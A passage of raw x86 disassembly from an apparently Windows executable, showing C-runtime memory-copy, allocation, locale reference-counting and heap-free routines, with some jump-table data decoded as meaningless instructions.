  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
